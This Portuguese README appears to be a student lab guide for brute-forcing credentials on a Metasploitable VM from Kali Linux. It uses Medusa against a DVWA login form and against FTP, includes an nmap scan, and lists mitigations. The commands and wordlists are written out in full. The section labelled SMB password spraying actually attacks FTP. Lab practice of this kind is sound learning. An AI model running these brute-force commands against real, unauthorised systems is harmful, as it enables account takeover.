# 💻 Simulação de Ataques em Ambiente Virtual

Este projeto demonstra a configuração de um ambiente virtual para simulação de ataques cibernéticos utilizando ferramentas como Kali Linux, Metasploitable e Medusa. O objetivo é estudar técnicas de força bruta e password spraying em serviços vulneráveis.

## 🧰 Ambiente Utilizado

- **VirtualBox** para virtualização
- **Kali Linux** como máquina atacante
- **Metasploitable** como máquina vulnerável

## 🎯 Objetivos

- Simular ataques de força bruta em FTP
- Automatizar tentativas de login em formulário web (DVWA)
- Realizar password spraying em SMB com enumeração de usuários
- 
---

## 🛠️ Preparação Inicial

Antes de iniciar os testes, é importante garantir que o ambiente virtual esteja corretamente configurado e conectado.

### 🔄 Criar Snapshot de Segurança

Antes de qualquer alteração, crie um **snapshot** no Metasploitable para garantir um ponto de restauração em caso de falhas ou erros durante os testes.

1. Acesse o sistema e clique no campo "Máquina" e em seguida "Criar snapshot".
2. O ideal é escrever tudo com letras minúsculas, sem espeço e não utilizar acentos ou caracteres especiais.

```text
configuracaoinicial
```

### 🔐 Acesso ao Metasploitable

1. Inicie a máquina **Metasploitable**.
2. Faça login com as seguintes credenciais:

```text
Usuário: msfadmin  
Senha: msfadmin
```
3. Descubra o ip da máquina

```bash
ip a
```

### 📡 Verificar Conectividade com Kali Linux

Com o ip do Metasploitable faça o teste para verificar a conectividade, no terminal da máquina **Kali Linux**, execute o seguinte comando:

```bash
ping -c 3 \\inserir o ip encontrado anteriormente
```

Se o retorno for positivo, o ambiente está pronto para iniciar os testes.

---
## 🔐 Ataque de Força Bruta em Formulário Web (DVWA)

### 📋 Descrição

Ataque de força bruta para descobrir credenciais de login em um formulário web vulnerável.

### 🧪 Procedimento

1. Acesse o modo desenvolvedor do navegador (`F12`) e vá até a aba **Network** para identificar os parâmetros enviados pelo formulário.
2. Crie listas de usuários e senhas através dos comandos abaixo:

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

3. Execute o ataque com o Medusa utilizando o seguinte comando:

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```

4. O Medusa exibirá os testes realizados e indicará o usuário válido através da seguinte mensagem `SUCCESS`.

### 🛡️ Mitigação

- Utilização de bibliotecas de autenticação robustas
- Implementação de CAPTCHA
- Autenticação multifator (2FA)

---

## 🧨 Password Spraying em SMB com Enumeração de Usuários

### 📋 Descrição

O ataque de password spraying em serviços SMB após enumeração de usuários e portas abertas.

### 🧪 Procedimento

1. Enumere os serviços disponíveis:

```bash
nmap -sV -p 21,80,445,139 192.168.56.101
```

2. Verifique se o serviço FTP está ativo:

```bash
ftp 192.168.56.101
```

3. Crie listas de usuários e senhas:

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

4. Execute o ataque com o Medusa:

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

5. O Medusa indicará sucesso com a mensagem `SUCCESS`.

6. Valide o acesso via FTP com as credenciais obtidas:

```bash
ftp 192.168.56.101
```

### 🛡️ Mitigação

- Políticas de senha fortes (letras, números e caracteres especiais)
- Troca periódica de senhas
- Restrição de tentativas de login

---

## 📎 Observações

Este projeto é apenas para fins educacionais criado a partir dos estudos em cybersecurity.
